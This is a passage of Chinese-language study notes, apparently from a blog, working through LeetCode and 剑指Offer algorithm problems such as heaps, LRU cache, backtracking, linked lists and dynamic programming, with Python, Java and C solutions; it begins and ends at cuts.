【数据结构】【堆】堆的建立、插入和删除_西西敏的博客-CSDN博客_堆的建立](https://blog.csdn.net/qq_39642978/article/details/111551332)\n\n为了将这个节点删除后的空位填补上，首先要将本堆中最后一个元素的值（假设为`value`）移动到此位置，然后在被删位置处，用此位置当前的值`value`和此处的父节点、子节点去比较，如果它与父节点的关系破坏了最大（小）堆，则递归调用`shiftUp()`来修复；如果它与子节点的关系破坏了最大（小）堆，则递归调用`shiftDown()`来修复。\n\n\n```c\nvoid maxJustHeap(int* array,int rootIdx,int heapSize){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int maxIdx = rootIdx;\n    if( leftIdx < heapSize && array[leftIdx] > array[maxIdx]){\n        maxIdx = leftIdx;\n    }\n    if( rightIdx < heapSize && array[rightIdx] > array[maxIdx]){\n        maxIdx = rightIdx;\n    }\n    if( maxIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[maxIdx];\n        array[maxIdx] = tmp;\n        maxJustHeap(array,maxIdx,heapSize);\n    }\n}\n\n\nvoid buildMaxHeap(int* array,int heapSize){\n    for(int i = heapSize/2 ; i >= 0; i--){\n        maxJustHeap(array,i,heapSize);\n    }\n}\n\n\nint findKthLargest(int* nums, int numsSize, int k){\n    buildMaxHeap(nums,numsSize);\n    int heapSize = numsSize;\n    for(int i = 0 ; i < k - 1 ; i ++){\n        //int tmp = nums[heapSize-1];\n        nums[0] = nums[heapSize-1];\n        heapSize -= 1;\n        maxJustHeap(nums,0,heapSize);\n    }\n    return nums[0];\n}\n```\n\n\n\n\n\n\n\n## 全排列\n\n![image-20220921160228336](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211602552.png)\n\n使用回溯算法解决\n\n参考：[回溯算法入门级详解 + 练习（持续更新） - 全排列 - 力扣（LeetCode）](https://leetcode.cn/problems/permutations/solution/hui-su-suan-fa-python-dai-ma-java-dai-ma-by-liweiw/)\n\n参考图解为\n\n![image-20220921160419171](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211604340.png)\n\n```python\nclass Solution:\n    def permute(self, nums: List[int]) -> List[List[int]]:\n        res = []\n        def back(nums,tmp):\n            if(not nums):\n                res.append(tmp)\n                return\n            for i in range(len(nums)):\n                tmpNums = nums[:i] + nums[i+1:]\n                tmpTmp = tmp + [nums[i]]\n                back(tmpNums,tmpTmp)\n        back(nums,[])\n        return res\n```\n\n即每次进入回溯时，进入下一轮的可遍历的数组都是上一轮的数组减去当前要进入`tmp`剩下的数组，在C上可以使用一个`int`数组`vis`来代替是否被遍历到了。\n\n\n\n## 寻找两个有序数组的中位数\n\n![image-20220921192837199](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209211928342.png)\n\n### 归并排序查找\n\n直接归并然后返回中位数的时间复杂度为`O(m+n)`\n\n```python\nclass Solution:\n    def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -> float:\n        result = []\n        i = 0\n        j = 0\n        nums1Len = len(nums1)\n        nums2Len = len(nums2)\n        while (True):\n            if(nums1Len == 0):\n                result += nums2\n                break\n            if(nums2Len == 0):\n                result += nums1\n                break\n            if (nums1[i] < nums2[j]):\n                result.append(nums1[i])\n                i += 1\n                if(i == nums1Len):\n                    result += nums2[j:]\n                    break\n            else:\n                result.append(nums2[j])\n                j += 1\n                if(j == nums2Len):\n                    result += nums1[i:]\n                    break\n        resultLen = len(result)\n        if(resultLen%2 == 0):\n            return (result[int(resultLen/2)-1] + result[int(resultLen/2)])/2\n        else:\n            return result[int(resultLen/2)]\n```\n\n### 二分查找\n\n即寻找两个有序数组排序之后的第k个数，假定如下\n\n```\nk = (len(a) + len(b))/2\t\t\tlen(a) + len(b)为奇数   \tk为中位数索引\nk = (len(a) + len(b))/2 + 1\t\tlen(a) + len(b)为偶数\t\tk为中位数索引+0.5\n```\n\n然后尝试比较`a[k/2-1]`和`b[k/2-1]`\n\n- `a[k/2-1] > b[k/2-1]`时，比`b[k/2-1]`小或等于的最多只有`(k/2-1)*2=k-2`个数，那么该数`b[k/2-1]`必定不可能是中位数，那么排除`b[0:k/2-1]`\n\n- `a[k/2-1] < b[k/2-1]`时，同理，排除`a[0:k/2-1]`\n- `a[k/2-1] = b[k/2-1]`时，也同理，排除`a[0:k/2-1]`和`b[0:k-2/1]`\n\n## 在排序数组中查找元素的第一个和最后一个位置\n\n![image-20221002103928281](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002103928281.png)\n\n### 二分查找\n\n时间复杂度为O(logn)，那么就用二分查找\n\n```python\nfrom typing import List\n\n\nclass Solution:\n    def search(self,nums,left,right,target):\n        if(left > right):\n            return None\n        mid = (left + right)//2\n        if(nums[mid] < target):\n            left = mid + 1\n            idx = self.search(nums,left,right,target)\n        elif(nums[mid] > target):\n            right = mid - 1\n            idx = self.search(nums,left,right,target)\n        elif(nums[mid] == target):\n            return mid\n        return idx\n\n    def searchRange(self, nums: List[int], target: int) -> List[int]:\n        res = []\n        idx = self.search(nums,0,len(nums)-1,target)\n        if(idx == None):\n            res = [-1,-1]\n        else:\n            left = idx - 1\n            right = idx + 1\n            while(left >= 0 and nums[left] == target):\n                left -= 1\n            while(right < len(nums) and nums[right] == target):\n                right += 1\n            res = [left+1,right-1]\n        return res\n```\n\n\n\n\n\n## LRU缓存Least Recently Used)\n\n![image-20221002153031254](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002153031254.png)\n\n- 使用哈希表`HashMap`来完成`key`的唯一性\n\n- 使用双向链表来完成`put`和`get`的时间复杂度要求，以及头部为最近使用的，尾部为最不常使用的\n- 要记得删除节点和更新节点的时候，都要更新hash表\n\n```java\nclass LRUCache {\n    class DLinkedNode{\n        private int key;\n        private int value;\n        private DLinkedNode next;\n        private DLinkedNode prev;\n\n\n        public DLinkedNode(){}\n        public DLinkedNode(int _key, int _value){\n            this.key = _key;\n            this.value = _value;\n        }\n\n\n    }\n\n    private int size;\n    private int capacity;\n    private Map<Integer,DLinkedNode> cache;\n    private DLinkedNode head;\n    private DLinkedNode tail;\n\n    public LRUCache(int capacity){\n        this.size = 0;\n        this.capacity = capacity;\n        this.head = new DLinkedNode();\n        this.tail = new DLinkedNode();\n        this.head.next = this.tail;\n        this.tail.prev = this.head;\n        this.cache = new HashMap<Integer,DLinkedNode>();\n    }\n\n    public void put(int key,int value){\n        DLinkedNode node = this.cache.get(key);\n        //如果不存在key,则直接放入头部\n        if(node == null){\n            DLinkedNode newNode = new DLinkedNode(key,value);\n            addToHead(newNode);\n            this.cache.put(key,newNode);\n            size ++;\n            //超出容量，删除末尾的节点,更新hash表\n            if(size > capacity){\n                DLinkedNode needRmNode = this.tail.prev;\n                removeNode(needRmNode);\n                this.cache.remove(needRmNode.key);\n                size --;\n            }\n        }else{\n            //存在key的话,就修改value,更新hash表,并且放入头部\n            node.value = value;\n            //this.cache.put(key,node);\n            moveToHead(node);\n        }\n\n    }\n\n    public int get(int key){\n        DLinkedNode node = this.cache.get(key);\n        //不存在该结点\n        if(node == null){\n            return -1;\n        }else {\n            //需要放入移动到头部\n            moveToHead(node);\n            return node.value;\n        }\n    }\n\n    public void addToHead(DLinkedNode node){\n        node.next = this.head.next;\n        node.prev = this.head;\n        this.head.next.prev = node;\n        this.head.next = node;\n    }\n\n    public void removeNode(DLinkedNode node){\n        node.prev.next = node.next;\n        node.next.prev = node.prev;\n    }\n\n    public void moveToHead(DLinkedNode node){\n        removeNode(node);\n        addToHead(node);\n    }\n}\n\n```\n\n\n\n## 有效括号\n\n利用栈匹配即可\n\n```python\nclass Solution:\n    def isValid(self, s: str) -> bool:\n        dict = {\n            \"(\":\")\",\n            \"[\":\"]\",\n            \"{\":\"}\"\n        }\n        stack = []\n        for chr in s:\n            if(chr in dict):\n                stack.append(chr)\n            else:\n                if(len(stack) > 0):\n                    top = stack.pop()\n                    if(dict[top] == chr):\n                        continue\n                    else:\n                        return False\n                else:\n                    return False\n        if(len(stack) == 0):\n            return True\n        else:\n            return False\n```\n\n\n\n## 买卖股票的最佳时机\n\n![image-20221005144848588](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221005144848588.png)\n\n一次遍历，找出当前阶段价格最小的一天然后进行计算利益替换最大利益\n\n```python\nclass Solution:\n    def maxProfit(self, prices: List[int]) -> int:\n        maxProfit = 0\n        minDay = 0\n        for i in range(0,len(prices)):\n            if(prices[i] < prices[minDay]):\n                minDay = i\n            elif(prices[i] - prices[minDay] > maxProfit):\n                maxProfit = prices[i] - prices[minDay]\n        return maxProfit\n```\n\n\n\n## 三数之和\n\n快排加双指针\n\n定位一个位置，然后一步步逼近\n\n参考：[三数之和（排序+双指针，易懂图解） - 三数之和 - 力扣（LeetCode）](https://leetcode.cn/problems/3sum/solution/3sumpai-xu-shuang-zhi-zhen-yi-dong-by-jyd/)\n\n![image-20221006151523738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221006151523738.png)\n\n```python\nclass Solution:\n    def threeSum(self, nums: [int]) -> [[int]]:\n        self.quickStart(nums)\n        res = []\n        for k in range(0,len(nums)-2):\n            if(nums[k] > 0):\n                break\n            if(k > 0 and nums[k-1]==nums[k]):\n                continue\n            j = len(nums) - 1\n            i = k + 1\n            while(i < j):\n                s = nums[k] + nums[i] + nums[j]\n                if(s < 0):\n                    i += 1\n                    while(i < j and nums[i] == nums[i-1]):\n                        i += 1\n                elif(s > 0):\n                    j -= 1\n                    while(i < j and nums[j] == nums[j+1]):\n                        j -= 1\n                else:\n                    res.append([nums[k],nums[i],nums[j]])\n                    i += 1\n                    j -= 1\n                    while i < j and nums[i] == nums[i - 1]: i += 1\n                    while i < j and nums[j] == nums[j + 1]: j -= 1\n        return res\n\n    def partition(self,nums,low,high):\n        pivot_idx = random.randint(low,high)\n        pivot = nums[pivot_idx]\n        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]\n        left = low\n        right = high\n        while(left < right):\n            while(left < right and pivot <= nums[right]):\n                right -= 1\n            nums[left] = nums[right]\n            while(left < right and pivot >= nums[left]):\n                left += 1\n            nums[right] = nums[left]\n        nums[left] = pivot\n        return left\n\n    def quickSort(self,nums,low,high):\n        if(low >= high):\n            return\n        mid = self.partition(nums,low,high)\n        self.quickSort(nums,low,mid - 1)\n        self.quickSort(nums,mid + 1 , high)\n\n    def quickStart(self,nums):\n        self.quickSort(nums,0,len(nums)-1)\n```\n\n\n\n## 不规则正方体表面积\n\n![image-20221007145633433](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007145633433.png)\n\n计算所有表面积减去重叠表面积\n\n```python\nclass Solution:\n    def surfaceArea(self, grid: List[List[int]]) -> int:\n        full = 0\n        overlap = 0\n        myLen = len(grid[0])\n        for i in range(0,myLen):\n            for j in range(0,myLen):\n                leftOver, topOver, rightOver, downOver = 0, 0, 0, 0\n                full += 1 * grid[i][j] * 4 + 1*2*(1 if grid[i][j] > 0 else 0)\n                if(i - 1 >= 0):\n                    topOver = min(grid[i][j],grid[i-1][j])*1\n                if(j - 1 >= 0):\n                    leftOver = min(grid[i][j],grid[i][j-1])*1\n                if(i + 1 < myLen):\n                    downOver = min(grid[i][j],grid[i+1][j])*1\n                if(j + 1 < myLen):\n                    rightOver = min(grid[i][j],grid[i][j+1])*1\n                tmplap = leftOver + topOver + rightOver + downOver\n                overlap += tmplap\n        return full - overlap\n```\n\n## 矩阵中的最长递增路径\n\n![image-20221007201543937](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007201543937.png)\n\n深度优先搜索加缓存，保证不重复遍历\n\n```java\nclass Solution {\n    private int[][] direction = {{-1,0},{1,0},{0,-1},{0,1}};\n    private int rowLens;\n    private int columnLens;\n    public int longestIncreasingPath(int[][] matrix) {\n        int result = 0;\n        this.rowLens = matrix.length;\n        this.columnLens = matrix[0].length;\n        int[][] mem = new int[rowLens][columnLens];\n        for(int row = 0 ; row < rowLens ; row++){\n            for(int column = 0 ; column < columnLens ; column++){\n                result = Math.max(result,dfs(matrix,mem,row,column));\n            }\n        }\n\n\n        return result;\n    }\n    public int dfs(int[][] matrix,int[][] mem,int row,int column){\n        if(mem[row][column] > 0){\n            return mem[row][column];\n        }\n        mem[row][column] += 1;\n        for(int i = 0 ; i < this.direction.length ; i ++){\n            int newRow = row + this.direction[i][0];\n            int newColumn = column + this.direction[i][1];\n            if(0 <= newColumn &&  newColumn < this.columnLens && 0 <= newRow &&  newRow < this.rowLens && matrix[newRow][newColumn] > matrix[row][column]){\n                mem[row][column] = Math.max(mem[row][column],dfs(matrix,mem,newRow,newColumn) + 1);\n            }\n        }\n        return mem[row][column];\n    }\n}\n```\n\n\n\n\n\n## 字符串解码\n\n![image-20221010141129667](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010141129667.png)\n\n利用栈即可实现\n\n```python\nclass Solution:\n    def decodeString(self, s: str) -> str:\n        res = \"\"\n        stack = []\n        pushList = \"0123456789[abcdefghijklmnopqrstuvwxyz\"\n        for i in s:\n            tmp = \"\"\n            if(i in pushList):\n                stack.append(i)\n            else:\n                top = stack.pop()\n                while(top != \"[\"):\n                    tmp = top + tmp\n                    top = stack.pop()\n                top = stack.pop() #pop [\n                #get num\n                num = \"\"\n                while(top != \"\" and ('0' <= top <= '9')):\n                    num = top + num\n                    if(len(stack) > 0):\n                        top = stack.pop()\n                    else:\n                        break\n                tmp = int(num) * tmp\n                if(top != \"\" and (top < '0' or top > '9')):\n                    stack.append(top)\n                stack = stack + list(tmp)\n        return res + \"\".join(stack)\n```\n\n\n\n## 整数反转\n\n![image-20221010144212174](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010144212174.png)\n\n使用模加除即可解决，主要考虑溢出情况\n\n```java\nclass Solution {\n    public int reverse(int x) {\n        if (x == Integer.MIN_VALUE) return 0;\n        int calcuTmp = 0;\n        int signed = 0;\n        if (x < 0) {\n            signed = -1;\n        } else if (x == 0) {\n            return x;\n        } else {\n            signed = 1;\n        }\n        int tmp = signed * x;\n        while (tmp != 0) {\n            if(calcuTmp > Integer.MAX_VALUE/10){\n                return 0;\n            }\n            calcuTmp *= 10;\n            calcuTmp += (tmp % 10);\n            tmp = (tmp - (tmp % 10)) / 10;\n        }\n        return signed * calcuTmp;\n    }\n}\n```\n\n\n\n## 电话号码的字母组合\n\n![image-20221010180907032](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010180907032.png)\n\n全排列问题基本都用回溯法解决，基本公式就是\n\n```python\ndef back(idx):\n\tif(limitCondition):\n        return\n\tfor i in inputList:\n\t\toperate()#一般都是push之类的\n    \tback(idx+1)\n        operate()#一般都是pop之类的\nback(0)\n```\n\n如下解决\n\n```python\nclass Solution:\n    def letterCombinations(self, digits: str) -> List[str]:\n\n        phoneMap = {\n            \"2\": \"abc\",\n            \"3\": \"def\",\n            \"4\": \"ghi\",\n            \"5\": \"jkl\",\n            \"6\": \"mno\",\n            \"7\": \"pqrs\",\n            \"8\": \"tuv\",\n            \"9\": \"wxyz\",\n        }\n        com = []\n        coms = []\n        def backTrace(idx):\n            if(idx == len(digits)):\n                return\n            digit = digits[idx]\n            for letter in phoneMap[digit]:\n                com.append(letter)\n                backTrace(idx + 1)\n                if(len(com) == len(digits)):\n                    coms.append(\"\".join(com))\n                com.pop()\n        backTrace(0)\n        return coms\n```\n\n\n\n\n\n## 删除链表的倒数第n个结点\n\n![image-20221011104404437](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011104404437.png)\n\n使用快慢指针\n\n- 定义伪头部节点，指向头部节点\n\n- 快指针同时指向伪头部节点\n- 快指针先遍历n次，慢指针不动\n- 快指针接着遍历，同时慢指针也开始遍历，快指针遍历到尾部，即`fastPoint.next=null`时结束，此时慢指针就遍历到`len(list) - n`个节点，即倒数第n个节点。\n\n```java\nclass Solution {\n    public ListNode removeNthFromEnd(ListNode head, int n) {\n        ListNode beHead = new ListNode();\n        beHead.next = head;\n        ListNode fastPoint = beHead;\n        ListNode slowPoint = beHead;\n        while(n > 0){\n            fastPoint = fastPoint.next;\n            n--;\n        }\n        while(fastPoint.next != null){\n            slowPoint = slowPoint.next;\n            fastPoint = fastPoint.next;\n        }\n        slowPoint.next = slowPoint.next.next;\n        return beHead.next;\n\n    }\n}\n```\n\n当然先一次遍历获取链表长度也可以。\n\n或者使用栈来进行辅助，遍历一遍全部压入，然后弹出N个结点即可。\n\n## 合并两个有序链表\n\n![image-20221011133912036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011133912036.png)\n\n直接归并即可\n\n```java\nclass Solution {\n    public ListNode mergeTwoLists(ListNode list1, ListNode list2) {\n        ListNode newList = new ListNode();\n        ListNode originList = newList;\n        while(list1 != null && list2 != null){\n            while(list1 != null && list2 != null && list1.val <= list2.val){\n                newList.next = list1;\n                newList = newList.next;\n                list1 = list1.next;\n            }\n            while(list1 != null && list2 != null && list2.val <= list1.val ){\n                newList.next = list2;\n                newList = newList.next;\n                list2 = list2.next;\n            }\n        }\n        if(list1 == null){\n            newList.next = list2;\n        }else{\n            newList.next = list1;\n            //newList.next.next = list1;\n        }\n        return originList.next;\n    }\n}\n```\n\n\n\n## 合并K个升序链表\n\n![image-20221011145532993](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011145532993.png)\n\n即归并分治\n\n```java\nclass Solution {\n    public ListNode mergeTwoLists(ListNode list1, ListNode list2) {\n        ListNode newList = new ListNode();\n        ListNode originList = newList;\n        while(list1 != null && list2 != null){\n            while(list1 != null && list2 != null && list1.val <= list2.val){\n                newList.next = list1;\n                newList = newList.next;\n                list1 = list1.next;\n            }\n            while(list1 != null && list2 != null && list2.val <= list1.val ){\n                newList.next = list2;\n                newList = newList.next;\n                list2 = list2.next;\n            }\n        }\n        if(list1 == null){\n            newList.next = list2;\n        }else{\n            newList.next = list1;\n            //newList.next.next = list1;\n        }\n        return originList.next;\n    }\n    public ListNode merge(ListNode[] lists, int left, int right) {\n        if (left == right) {\n            return lists[left];\n        }\n        if (left > right) {\n            return null;\n        }\n        int mid = (left + right) / 2;\n        return mergeTwoLists(merge(lists, left, mid), merge(lists, mid + 1, right));\n    }\n\n    public ListNode mergeKLists(ListNode[] lists) {\n        return merge(lists, 0, lists.length-1);\n    }\n}\n\n```\n\n需要注意的是使用`left == right`来确定每一个都遍历到。\n\n\n\n## 找出字符串中第一个匹配项的下标\n\n![image-20221011164112082](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011164112082.png)\n\n爆破遍历即可\n\n```python\nclass Solution:\n    def strStr(self, haystack: str, needle: str) -> int:\n        i,j=0,0\n        res = len(haystack)\n        for cIdx in range(len(haystack)):\n            i = cIdx\n            j = 0\n            if(haystack[i] == needle[j]):\n                while(j < len(needle) and i < len(haystack) and haystack[i] == needle[j]):\n                    i += 1\n                    j += 1\n                if(j == len(needle)):\n                    res = min(res,i - len(needle))\n                    #i -= 1\n            else:\n                i += 1\n        if(res == len(haystack)):\n            return -1\n        else:\n            return res\n```\n\n# 剑指Offer\n\n## 两个栈实现队列\n\n![image-20221014144203634](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144203634.png)\n\n一个栈当输入，一个栈当输出\n\n```python\nclass CQueue:\n    def __init__(self):\n        self.A = []\n        self.B = []\n\n    def appendTail(self, value: int) -> None:\n        self.A.append(value)\n\n    def deleteHead(self) -> int:\n        if(len(self.B) != 0):\n            return self.B.pop()\n        else:\n            while(len(self.A) != 0):\n                self.B.append(self.A.pop())\n        if(len(self.B) == 0):\n            return -1\n        else:\n            return self.B.pop()\n```\n\n## 数组中重复的数字\n\n![image-20221014144507145](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144507145.png)\n\n使用hash表即可\n\n```python\nclass Solution:\n    def findRepeatNumber(self, nums: List[int]) -> int:\n        hashset = set()\n        for i in nums:\n            if(i in hashset):\n                return i\n            else:\n                hashset.add(i)\n        return -1\n```\n\n\n\n## 反转链表\n\n![image-20221014152712281](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014152712281.png)\n\n先是自己写的，从尾部开始改变，时间耗费较多\n\n```python\nclass Solution:\n    def reverseList(self, head: ListNode) -> ListNode:\n        if(head == None or head.next == None):\n            return head\n        originHead = head\n        n = 0\n        flag = 0\n        while(originHead.next != None):\n            head = originHead\n            while(head.next != None):\n                tmp = head\n                next = head.next\n                head = next\n            flag += 1\n            if(flag == 1):\n                newHead = head\n            tmp.next = None\n            head.next = tmp\n        return newHead\n```\n\n后面看题解，可以用多指针来代替，暂存前中后三个节点\n\n[剑指 Offer 24. 反转链表（迭代 / 递归，清晰图解） - 反转链表 - 力扣（LeetCode）](https://leetcode.cn/problems/fan-zhuan-lian-biao-lcof/solution/jian-zhi-offer-24-fan-zhuan-lian-biao-die-dai-di-2/)\n\n```python\nclass Solution:\n    def reverseList(self, head: ListNode) -> ListNode:\n        pre = None\n        cur = head\n        while(cur != None):\n            tmp = cur.next\n            cur.next = pre\n            pre = cur\n            cur = tmp\n        return pre\n```\n\n同样的循环可以转化为递归\n\n## 连续子数组的最大和\n\n最优子数组的一般都能动态规划\n\n![image-20221015102433428](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015102433428.png)\n\n动态规划\n\n设dp[i]为以i为结尾的连续子数组和的最大值，即可得到状态转换方程\n\n```\ndp[i] = max(nums[i],dp[i-1] + nums[i])\n```\n\n依据状态转换方程得到代码\n\n```python\nclass Solution:\n    def maxSubArray(self, nums: List[int]) -> int:\n        dp = [0] * len(nums)\n        for i in range(len(nums)):\n            if(i == 0):\n                dp[i] = nums[0]\n                res = dp[i]\n            else:\n                dp[i] = max(nums[i],dp[i-1] + nums[i])\n                res = max(res,dp[i])\n        return res\n```\n\n## 链表中倒数第k个节点\n\n![image-20221015104808017](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015104808017.png)\n\n快慢指针\n\n```python\nclass Solution:\n    def getKthFromEnd(self, head: ListNode, k: int) -> ListNode:\n        originHead = head\n        n = 0\n        while(n != k):\n            n += 1\n            head = head.next\n        while(head != None):\n            originHead = originHead.next\n            head = head.next\n        return originHead\n```\n\n## 把数字翻译成字符串\n\n![image-20221015161943235](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015161943235.png)\n\n动态规划，详见[面试题46. 把数字翻译成字符串（动态规划，清晰图解） - 把数字翻译成字符串 - 力扣（LeetCode）](https://leetcode.cn/problems/ba-shu-zi-fan-yi-cheng-zi-fu-chuan-lcof/solution/mian-shi-ti-46-ba-shu-zi-fan-yi-cheng-zi-fu-chua-6/)\n\n```python\nclass Solution:\n    def translateNum(self, num: int) -> int:\n        numStr = str(num)\n\n        dp = [0] * (len(numStr) + 1)\n        for i in range(0, len(numStr)):\n            if (i == 0):\n                dp[i] = 1\n                continue\n            if (10 <= int(numStr[i - 1]) * 10 + int(numStr[i]) <= 25):\n                if (i - 2 == -1):\n                    dp[i] = 2\n                    continue\n                dp[i] = dp[i - 2] + dp[i - 1]\n            else:\n                dp[i] = dp[i - 1]\n        return dp[len(numStr) - 1]\n```\n\n需要注意的是组合的数字范围为10~25，而不是0~25，因为01、02......不能进行组合翻译，我说怎么一直错\n\n\n\n\n\n## 字符串的排列\n\n![image-20221015113114460](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015113114460.png)\n\n回溯加去重\n\n```python\nclass Solution:\n    def permutation(self, s: str) -> List[str]:\n        res = []\n        def back(s, tmp):\n            #到末尾时添加\n            if (not s):\n                res.append(\"\".join(tmp))\n                return\n            for i in range(len(s)):\n                #去掉当前的字符的数组，传入下一层的回溯函数\n                tmpNums = s[:i] + s[i + 1:]\n                #表示当前层的字符\n                tmpTmp = tmp + [s[i]]\n                #调用回溯\n                back(tmpNums, tmpTmp)\n        back(s, [])\n        hashSet = set()\n        for i in res:\n            hashSet.add(i)\n        return list(hashSet)\n```\n\n\n\n\n\n## 从尾到头打印链表\n\n栈\n\n![image-20221015162618579](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015162618579.png)\n\n```python\nclass Solution:\n    def reversePrint(self, head: ListNode) -> List[int]:\n        stack = []\n        while(head != None):\n            stack.append(head.val)\n            head = head.next\n        res = []\n        while(len(stack) != 0):\n            res.append(stack.pop())\n        return res\n```\n\n\n\n## 斐波那契数列\n\n![image-20221016150131190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016150131190.png)递归会超时，所以转化为循环\n\n```python\nclass Solution:\n    F = []\n    def fib(self, n: int) -> int:\n        if(n == 0):\n            return 0\n        if(n == 1):\n            return 1\n        self.F = [0] * (n+1)\n        self.F[0] = 0\n        self.F[1] = 1\n        i = 2\n        while( i <= n):\n            self.F[i] = (self.F[i-2] + self.F[i-1])% 1000000007\n            i += 1\n        return self.F[n]\n```\n\n但是还有时间复杂度更低的矩阵快速幂\n\n参考官方解，时间复杂度为`O(logn)`\n\n[斐波那契数列 - 斐波那契数列 - 力扣（LeetCode）](https://leetcode.cn/problems/fei-bo-na-qi-shu-lie-lcof/solution/fei-bo-na-qi-shu-lie-by-leetcode-solutio-hbss/)\n\n![image-20221016154942500](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016154942500.png)\n\n```python\nimport numpy as np\nclass Solution:\n    def fib(self, n: int) -> int:\n        def quickMi(num,power):\n            ans = 1\n            while (power > 0):\n                if(power & 1 > 0): #奇数则再乘以底数\n                    ans = np.dot(ans, num) % 1000000007\n                num = np.dot(num,num)\n                power = power >> 1\n            return ans\n        matrix = np.array([[1, 1], [1,0]])\n        res = quickMi(matrix,n-1)\n        return res[0][0]\n```\n\n\n\n## 扑克牌中的顺子\n\n![image-20221016162013412](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016162013412.png)\n\n顺子长度不一定为5时\n\n先确定0的个数`count`，排除0，然后hash去重，得到`hashSet`\n\n先判断去重后`hashSet`加`count`的长度是否还是为原数组长度，如果改变则代表有相同的非0元素，则不可能为顺子，直接`False`\n\n判断此时`listNums`中最大和最小的差值是否小于等于0的个数`count`加`len(listNums)`，小于等于则为`True`，否则为`False`\n\n```python\nimport random\nfrom typing import List\n\n\nclass Solution:\n    def parition(self,nums,low,high):\n        pivot_idx = random.randint(low,high)\n        pivot = nums[pivot_idx]\n        left,right = low,high\n        nums[left],nums[pivot_idx] = nums[pivot_idx],nums[left]\n        while(left < right):\n            while(left < right and nums[right] > pivot):\n                right -= 1\n            nums[left] = nums[right]\n            while(left < right and nums[left] <= pivot):\n                left += 1\n            nums[right] = nums[left]\n        nums[left] = pivot\n        return left\n\n    def quickSort(self,nums,low,high):\n        if(low > high):\n            return\n        mid = self.parition(nums,low,high)\n        self.quickSort(nums,low,mid-1)\n        self.quickSort(nums,mid+1,high)\n\n    def sortArray(self,nums):\n        self.quickSort(nums,0,len(nums)-1)\n        return nums\n\n    def isStraight(self, nums: List[int]) -> bool:\n        hashSet = set()\n        count = 0\n        for i in nums:\n            if(i == 0):\n                count += 1\n                continue\n            hashSet.add(i)\n        if(len(hashSet) + count != len(nums)):\n            return False\n        listNums = list(hashSet)\n        listNums = self.sortArray(listNums)\n        if(listNums[len(listNums)-1] - listNums[0] <= count + len(listNums) - 1):\n            return True\n        else:\n            return False\n\n```\n\n\n\n## 二叉搜索树与双向链表\n\n![image-20221017161643904](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017161643904.png)\n\n结合中序遍历的特点，加入处理\n\n```java\nvoid inorderTraversal(Node cur) {\n    if(cur == null)\n        return;\n    inorderTraversal(cur.left);\n    //.......处理指针\n    inorderTraversal(cur.right);\n}\n```\n\n然后每次处理的时候，利用前驱节点`pre`与当前节点`cur`进行处理\n\n```java\nif(pre != null){\n    pre.right = cur;\n    cur.left = pre;\n    pre = cur;\n}\n```\n\n当前驱节点`pre`为`null`时说明在遍历头节点，那么得到头节点，如下\n\n```java\nelse {\n    head = cur;\n    pre = cur;\n}\n```\n\n记得最后在头节点和尾部节点也要加入双向指针\n\n```java\nhead.left = pre;\npre.right = head;\n```\n\n最终如下\n\n```java\nclass Solution {\n    Node pre, head;\n    public Node treeToDoublyList(Node root) {\n        if(root == null)\n            return null;\n        inorderTraversal(root);\n        head.left = pre;\n        pre.right = head;\n        return head;\n    }\n    void inorderTraversal(Node cur) {\n        if(cur == null)\n            return;\n        inorderTraversal(cur.left);\n        if(pre != null){\n            pre.right = cur;\n            cur.left = pre;\n            pre = cur;\n        }else {\n            head = cur;\n            pre = cur;\n        }\n        inorderTraversal(cur.right);\n    }\n}\n```\n\n## 树的子结构\n\n![image-20221017231434539](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017231434539.png)\n\n先找到结点数值相同的结点\n\n```python\ndef findNode(self, rootA: TreeNode, rootB: TreeNode):\n    if(rootA == None or rootB == None):\n        return False\n    if(rootA.val != rootB.val):#先找到\n        return self.findNode(rootA.left, rootB) or self.findNode(rootA.right, rootB)\n    else:\n        #.....找到了就判断\n```\n\n判断\n\n```python\ndef judge(self,rootA: TreeNode,rootB: TreeNode):\n    if(rootB == None):#遍历到最后了代表一致\n        return True\n    if(rootA == None):#A遍历完还没有代表没有\n        return False\n    if(rootA.val == rootB.val and self.judge(rootA.left,rootB.left) and self.judge(rootA.right,rootB.right)):\n        return True\n    return False\n```\n\n最终结果\n\n```python\nclass Solution:\n    def judge(self,rootA: TreeNode,rootB: TreeNode):\n        if(rootB == None):\n            return True\n        if(rootA == None):\n            return False\n        if(rootA.val == rootB.val and self.judge(rootA.left,rootB.left) and self.judge(rootA.right,rootB.right)):\n            return True\n        return False\n\n\n    def findNode(self, rootA: TreeNode, rootB: TreeNode):\n        if(rootA == None or rootB == None):\n            return False\n        if(rootA.val != rootB.val):#先找到\n            return 